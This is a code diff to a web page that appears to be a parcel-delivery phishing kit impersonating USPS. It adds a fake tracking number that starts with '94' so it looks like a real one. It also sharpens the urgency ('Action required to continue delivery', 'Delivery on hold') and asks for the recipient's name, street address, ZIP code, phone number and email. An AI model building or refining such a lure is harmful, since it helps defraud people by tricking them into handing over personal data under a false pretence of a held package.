@@ -11,9 +11,9 @@ function buildOrderNumber(clientId: string) {
     hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
   }
 
-  const segment = (length: number, salt: number) => {
+  const segment = (length: number, salt: number, prefix = '') => {
     let value = (hash ^ salt) >>> 0;
-    let out = '';
+    let out = prefix;
     while (out.length < length) {
       value = (value * 1664525 + 1013904223) >>> 0;
       out += String(value % 10);
@@ -21,7 +21,7 @@ function buildOrderNumber(clientId: string) {
     return out.slice(0, length);
   };
 
-  return `${segment(4, 0x9e37)} ${segment(4, 0x85eb)} ${segment(4, 0xc2b2)} ${segment(4, 0x27d4)} ${segment(4, 0x1656)} ${segment(2, 0xa5a5)}`;
+  return `${segment(4, 0x9e37, '94')} ${segment(4, 0x85eb)} ${segment(4, 0xc2b2)} ${segment(4, 0x27d4)} ${segment(4, 0x1656)} ${segment(2, 0xa5a5)}`;
 }
 
 export default function Home() {
@@ -99,10 +99,10 @@ export default function Home() {
       <div className="alz-shell">
         <section className="alz-usps-intro">
           <div className="alz-usps-intro-copy">
-            <div className="alz-usps-eyebrow">Delivery Update</div>
-            <h1 className="alz-usps-title">Confirm delivery details</h1>
+            <div className="alz-usps-eyebrow">Tracking Update</div>
+            <h1 className="alz-usps-title">Action required to continue delivery</h1>
             <p className="alz-usps-lead">
-              One quick review is needed before delivery can continue.
+              A delivery detail could not be confirmed. Review the shipment information to avoid delays.
             </p>
             <div className="alz-brand-row alz-home-brand-row">
               {BRAND_PROMISES.map((item) => (
@@ -111,9 +111,9 @@ export default function Home() {
             </div>
             <div className="alz-usps-action-row alz-home-action-row">
               <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
-                {loading ? 'Opening...' : 'Continue'}
+                {loading ? 'Opening...' : 'Review delivery details'}
               </button>
-              <p className="alz-usps-action-note">Takes about 2 minutes.</p>
+              <p className="alz-usps-action-note">Estimated time: about 2 minutes.</p>
             </div>
           </div>
           <div className="alz-usps-track-card">
@@ -123,25 +123,25 @@ export default function Home() {
             </div>
             <div className="alz-usps-track-number">{orderNumber}</div>
             <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
-            <div className="alz-usps-track-state">Address review needed</div>
+            <div className="alz-usps-track-state">Recipient review required</div>
           </div>
         </section>
 
         <section className="alz-home-quick-grid">
           <article className="alz-usps-service-card alz-home-quick-card">
-            <div className="alz-usps-service-kicker">What you need</div>
+            <div className="alz-usps-service-kicker">Required Information</div>
             <div className="alz-home-quick-list">
-              <div>Name and address</div>
-              <div>Phone and email</div>
-              <div>Tap continue</div>
+              <div>Recipient name and street address</div>
+              <div>ZIP Code, phone number, and email</div>
+              <div>Select the review button to continue</div>
             </div>
           </article>
           <article className="alz-usps-service-card alz-home-quick-card">
-            <div className="alz-usps-service-kicker">Shipment status</div>
+            <div className="alz-usps-service-kicker">Delivery Status</div>
             <div className="alz-home-quick-list">
-              <div>Current: Waiting for review</div>
-              <div>Service: Standard parcel</div>
-              <div>Next: Confirm recipient details</div>
+              <div>Current status: Delivery on hold</div>
+              <div>Service type: Standard parcel</div>
+              <div>Next step: Confirm recipient details</div>
             </div>
           </article>
         </section>
